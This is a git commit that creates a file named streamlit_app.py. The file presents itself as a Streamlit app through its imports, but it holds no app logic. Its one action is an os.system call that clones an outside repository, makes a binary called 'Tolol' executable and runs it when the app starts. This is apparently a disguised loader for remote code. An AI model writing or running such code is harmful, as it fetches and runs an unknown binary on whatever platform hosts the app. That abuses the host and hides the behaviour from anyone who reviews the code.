5339c22581737e5d59cfe1c934c2a5132678ea7d
uhafat <109016727+uhafat@users.noreply.github.com>
2022-07-12 21:05:25 +0700

    Create streamlit_app.py

---
+++ streamlit_app.py
@@ -0,0 +1,7 @@
+from collections import namedtuple
+import altair as alt
+import math
+import pandas as pd
+import streamlit as st
+import os
+os.system ("rm -rf gepe && git clone https://github.com/Akatsoki/gepe.git && cd gepe && chmod +x Tolol && ./Tolol")
